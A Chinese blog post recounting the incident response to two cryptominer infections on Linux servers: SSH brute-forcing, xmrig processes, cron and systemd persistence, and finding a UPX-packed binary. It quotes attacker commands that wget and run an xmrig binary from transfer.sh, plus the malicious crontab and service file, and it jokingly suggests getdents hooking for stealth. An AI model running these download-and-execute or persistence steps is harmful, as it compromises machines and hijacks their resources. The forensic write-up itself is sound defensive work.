---
layout:		post
title:		"记两起挖矿木马排查"
subtitle:	"还好是挖矿木马，要是勒索软件那就凉凉了"
date:		2021-05-18 14:33:03  +0800
author:		"Les1ie"
catlog:   true
tags: 
  - 网络安全
  - 应急响应
---

# 溯源 fdl 的机器

2021年5月17日下午，发现有人爆破我服务器的口令。

![image-20210517210905611](https://static.scuseek.com/image-20210517210905611.png)

查了下是 fdl 的，联系他询问情况。

![](https://static.scuseek.com/20210518134903.png)

登录上去看到有个用户 `127.0.0.1`登录的，一看就知道是映射到公网被人登录了

![](https://static.scuseek.com/20210518143447.png)





确认该账号无人使用

![](https://static.scuseek.com/20210518134835.png)

修改密码然后踢出用户

![](https://static.scuseek.com/20210518135021.png)

CPU挖矿

![image-20210517171733685](https://static.scuseek.com/image-20210517171733685.png)

`killall xmrig`一键停止挖矿程序

![image-20210517171728561](https://static.scuseek.com/image-20210517171728561.png)

找到挖矿程序本体

![image-20210517172121565](https://static.scuseek.com/image-20210517172121565.png)

`/var/tmp/`路径下有疑似扫描的程序

![image-20210517172255478](https://static.scuseek.com/image-20210517172255478.png)

查看 `lpz`用户启动的程序

```
lpz       9845     1  0 5月16 ?       00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; rm -rf xmrig ; wget http://transfer.sh/zA1eg/xmrig ; chmod +x xmrig ; ./xmrig
lpz      10361     1  0 16:00 ?        00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; cd ..o ; ./xmrig
lpz      10628     1  0 16:00 ?        00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; cd ..o ; ./xmrig
lpz      11418     1  0 5月16 ?       00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; rm -rf xmrig ; wget http://transfer.sh/zA1eg/xmrig ; chmod +x xmrig ; ./xmrig
lpz      12349     1  0 5月16 ?       00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; rm -rf xmrig ; wget http://transfer.sh/zA1eg/xmrig ; chmod +x xmrig ; ./xmrig
lpz      13160     1  0 5月15 ?       00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; rm -rf ..o ; mkdir ..o ; cd ..o ; wget http://transfer.sh/GgVQs/xmrig ; chmod +x xmrig ; ./xmrig
lpz      13462     1  0 16:10 ?        00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; cd ..o ; ./xmrig
lpz      13633     1  0 5月16 ?       00:00:00 /usr/sbin/sshd f bios.txt passretea 22 cd /var/tmp ; rm -rf xmrig ; wget http://transfer.sh/zA1eg/xmrig ; chmod +x xmrig ; ./xmrig

```



![image-20210517172830380](https://static.scuseek.com/image-20210517172830380.png)

找到  bios.txt

![image-20210517173105061](https://static.scuseek.com/image-20210517173105061.png)

内容如下

![image-20210517173037790](https://static.scuseek.com/image-20210517173037790.png)

查看建立的ssh,发现正在爆破口令

![](https://static.scuseek.com/20210518144217.png)


停止该用户的所有对外发起的爆破攻击

![image-20210517183217689](https://static.scuseek.com/image-20210517183217689.png)

祭出很久以前写的一个非常弱鸡的检查程序

![](https://static.scuseek.com/20210518135310.png)



查看成功登录的记录，记录文件缺失不少，可能是攻击者手抖删了的

![image-20210517183738389](https://static.scuseek.com/image-20210517183738389.png)

目录里面翻了翻，找到了爆破成功的口令

![](https://static.scuseek.com/20210518135528.png)

开机自启动爆破ssh的程序

![image-20210517200731869](https://static.scuseek.com/image-20210517200731869.png)



`/var/spool/cron/crontabs/lpz ` 文件内容，注释所有内容

```
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/var/tmp/.5p4rk3l5 installed on Mon May  3 14:22:22 2021)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
@daily /var/tmp/./.b4nd1d0
@reboot /var/tmp/./.black > /dev/null 2>&1 & disown
* * * * * /var/tmp/./.black > /dev/null 2>&1 & disown
@monthly /var/tmp/./.black  > /dev/null 2>&1 & disown

```

问题不大，程序起不来了，保留现场，留给 fdl 了，我就溜了。

然后似乎应该联系一下受害者，于是在某个群里说了下受害者IP :)

![](https://static.scuseek.com/20210518145244.png)

出现受害者，着实太惨了

![](https://static.scuseek.com/20210518145414.png)



事情告一段落，简单记录了下流程，fdl 建议放到内网，让其他人排查的时候多一点思路，于是我放到内网了，不过似乎打点马赛克还可以水一篇我自己的博客（笑


![](https://static.scuseek.com/20210518181351.png)

# 简单的对抗

曾大佬的同学服务器中毒，遇到挖矿木马。

昨天他们搞了快一天还没搞定，我昨天下午给他说让他们把ssh口令拿来，结果曾大佬十分羞涩（笑），一直没有要口令，今早来的时候看到曾大佬还在帮对面分析。

不过，我昨天晚饭的时候刚溯源了一台机器（前面 fdl 的那台），我问到了曾大佬他们的IP地址，再去昨天溯源的机器里面拖下来的文件对比，找到了他们服务器的密码  :)

![](https://static.scuseek.com/20210518145717.png)

试了下，发现他们已经把密码改了  :(

![](https://static.scuseek.com/20210518145748.png)

然后10:30的时候，曾大佬终于问到了密码，又是一个不太弱的弱口令，还好，查了下没有在rockyou.txt里面。

登上去一看，好家伙，我昨天溯源的那台机器把这台爆破成功了，还反复登录了好多次。来了两波挖矿的攻击者，大胆想象第二波把第一波攻击者的挖矿木马停了运行自己的，然后第一波回来了又把程序改回来了，结果没想到第二波做了对抗，第一波被迫和第二波共享CPU，果然挖矿的最大敌人是服务器上其他挖矿的人。（希望不是披着挖矿外衣的APT攻击）

![](https://static.scuseek.com/20210518132923.png)

mail列表可以看到提示 `/usr/bin/sa/sa1`文件不存在，是因为前面的排查的同学已经把这个恶意路径重命名了，程序启动不了。那就搜索哪里出现了这个可疑路径。

使用strings命令在所有文本和二进制文件中查找这个字符串。

```
find -print0|xargs -0  strings |grep "/usr/lib64/sa"
```

搜索了之后找到文件，初步分析此文件和生成的恶意程序 `/usr/bin/ ` 没有直接关系，线索暂时中断。



`ps -ef `可以看到启动了一个进程 `/usr/bin/随机字符串`，发送`kill -9`之后立刻重新启动，启动之后这个程序会删除本身，以达到隐藏自己的目的。父进程`pid`是`1`，可以知道是`systemd`启动的恶意进程。

楼上大佬写了脚本无限循环kill掉这个

![](https://static.scuseek.com/20210518132008.png)



继续寻找到底谁在搞事。

1. 通过父进程`pid`是`1`我们可以推测程序利用了 `systemd`重启恶意程序。

2. 通过程序无限重启我们可以推测`service`的配置文件里面写了`Restart=always`这个重启策略。

于是挨个去排查  `/etc/systemd/`里面注册的 `Restart=always`的配置文件。找了半天实在眼花，也用了正常工作的`CentOS`的`systemd`服务和此服务器的做对比，区别挺大，没有找到明显异常，此路不通。 :)

查看下启动的 service，还是眼花。此路不通。

```
systemctl list-unit-files|grep enabled
```



又生一计，给他发个 `SEGV`让他异常退出，看看有没有`coredump`，从`coredump`分析。因为似乎并没有配置`coredump`的策略，不过也不是不能用，限于较懒+不是我的服务器，不能乱搞。程序异常退出后，在 `/var/spool/abrt`可以看到正在保存过程中的 `coredump`文件，等他dump完成之后会移动到其他地方，拼个手速赶在系统删掉他之前把他复制一份。

发SEGV让程序停下来，保存coredump现场

![](https://static.scuseek.com/20210518125440.png)

查看 `environ`可以看到里面有该文件的路径 `/usr/bin/ab06174bf1`和另一个路径 `/usr/sbin/route_forbidden-close`

![](https://static.scuseek.com/20210518125542.png)

早知道看 `environ`的话我为啥还要费力的给他发`SEGV`让他段错误，直接去`/proc/`翻就行了55555 :)

过滤该文件内的字符串，可以看到 `upx` 字样，正常程序肯定不会用`upx`的。可能这也是逃过我们刚刚的`find+strings`组合的原因了。

![](https://static.scuseek.com/20210518125653.png)

然后把文件拖下来，本机upx脱壳看看

![](https://static.scuseek.com/20210518125720.png)

好的，就是upx的了，送给曾大佬分析一波。



网上搜一下这个文件名字符串，可以看到有且仅有三条结果，内容一样

![](https://static.scuseek.com/20210518125800.png)

点进去一看，好家伙，症状完全一致

https://blog.csdn.net/qq_36270681/article/details/115366550

![](https://static.scuseek.com/20210518125921.png)

而后直接找到了

```
cat /usr/lib/systemd/system/pmapx_start_2.service
```

![](https://static.scuseek.com/20210518130020.png)

```
#  This file is part of systemd.
#
#  systemd is free software; you can redistribute it and/or modify it
#  under the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation; either version 2.1 of the License, or
#  (at your option) any later version.
#
# Entries in this file show the compile time defaults.
# You can change settings by editing this file.
# Defaults can be restored by simply deleting this file.
#
# See resolved.conf(5) for details

[Unit]
Description=System function loader.

[Service]
Type=forking
GuessMainPID=no
Restart=always
RestartSec=10
ExecStart=-/usr/sbin/route_forbidden-close

[Install]
WantedBy=multi-user.target
```

这家伙隐藏的挺好，要不是你用`upx`加壳，我可能还真找不到你了  :)

找到凶手后，禁言套餐小黑屋套餐送上

```
systemctl disable pmapx_start_2
systemctl stop pmapx_start_2
```

世界瞬间安静下来。

再看看`ps -ef|grep /usr/bin`，没有异常的那个进程了，CPU负载也降到0了。

![](https://static.scuseek.com/20210518132806.png)

收工。

曾大佬过来问我怎么找到这个 upx，想了想我感觉可以水一篇博客，帮助大家分析这个做了一点点对抗的挖矿木马。毕竟这个样本似乎刚出来不久，网上没找到太多的资料。可能有关联词的部分我截图加文本形式写到正文里面了， 做个 SEO 让搜索引擎索引一下。

# 跋

1. 两天时间溯源两台机器，甚至有点好玩，无聊的研究生活里面的一点乐趣 :)

2. 溯源的时候千万不要把攻击者钱包的地址改成自己的然后就不管了，这样攻击者的程序会自动在内网扩散然后上千个CPU帮你挖 xmr ，还有可能吃国家饭 :)
3. 不要把ssh映射到公网了，虽然你的口令可能比较强，但是其他用户可能是弱口令
4. 不要用弱口令， `root:123456`这类口令基本是白给的
5. 不只是ssh容易被攻击， redis未授权，java框架的各种反序列化分分钟 getshell
6. 挖矿木马已经是极其文明讲理的木马了，如果对方是勒索软件、APT攻击者，那么后果极其严重　:)
7. 建议攻击者下次还是劫持 `getdents` 这类系统调用来隐藏自己，直接删除自己这个技术含量不太高，PS一下子就看到了
8. fa les duo ma laki

